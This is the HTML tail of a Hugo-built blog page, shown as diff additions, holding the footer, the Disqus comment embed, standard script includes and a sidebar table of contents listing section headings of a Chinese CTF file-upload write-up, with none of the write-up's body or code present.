+            <a href="/tags/file_upload/">file_upload</a>
+        
+            <a href="/tags/security/">security</a>
+        
+            <a href="/tags/server_side_vul/">server_side_vul</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    <section class="article-lastmod">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <span>
+            Last updated on May 01, 2022 13:05 BST
+        </span>
+    </section></footer>
+
+
+    
+        <link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.css"integrity="sha384-RZU/ijkSsFbcmivfdRBQDtwuwVqK7GMOw6IMvKyeWL2K5UAlyp6WonmB8m7Jd0Hn"crossorigin="anonymous"
+            ><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.js"integrity="sha384-pK1WpvzWVBQiP0/GjnvRxV4mOb0oxFuyRxJlk6vVw146n3egcN5C925NCP7a7BY8"crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/contrib/auto-render.min.js"integrity="sha384-vZTG03m&#43;2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl"crossorigin="anonymous"
+                defer
+                >
+            </script><script>
+    window.addEventListener("DOMContentLoaded", () => {
+        renderMathInElement(document.querySelector(`.article-content`), {
+            delimiters: [
+                { left: "$$", right: "$$", display: true },
+                { left: "$", right: "$", display: false },
+                { left: "\\(", right: "\\)", display: false },
+                { left: "\\[", right: "\\]", display: true }
+            ]
+        });})
+</script>
+    
+</article>
+
+    
+
+    
+
+<aside class="related-contents--wrapper">
+    <h2 class="section-title">Related contents</h2>
+    <div class="related-contents">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/posts/sqli_blind_injection/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">SQL注入：盲注</h2>
+        </div>
+    </a>
+</article>
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script type="application/javascript">
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "medicwrf" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (DISQUS) {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2022 Under The Ginkgo
+    </section>
+    
+    <section class="powerby">
+        
+            Cogito, ergo sum <br/>
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.11.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#file-upload-ggctf-upload">File Upload: ggctf-upload</a>
+      <ul>
+        <li><a href="#js">JS</a>
+          <ul>
+            <li><a href="#解法一-抓包修改白名单">解法一：抓包修改白名单</a></li>
+            <li><a href="#解法二-禁用js">解法二：禁用JS</a></li>
+            <li><a href="#解法三-js-debug">解法三：JS debug</a></li>
+          </ul>
+        </li>
+        <li><a href="#解析上传">解析上传</a></li>
+        <li><a href="#mime-绕过">MIME 绕过</a></li>
+        <li><a href="#文件头绕过">文件头绕过</a></li>
+        <li><a href="#有缺陷的代码1">有缺陷的代码1</a></li>
+        <li><a href="#有缺陷的代码2">有缺陷的代码2</a></li>
+        <li><a href="#古老的漏洞-1">古老的漏洞 - 1</a></li>
+        <li><a href="#古老的漏洞-2">古老的漏洞 - 2</a></li>
+        <li><a href="#黑名单缺陷">黑名单缺陷</a></li>
+        <li><a href="#条件竞争">条件竞争</a></li>
+        <li><a href="#二次渲染">二次渲染</a>
+          <ul>
+            <li><a href="#gif">GIF</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
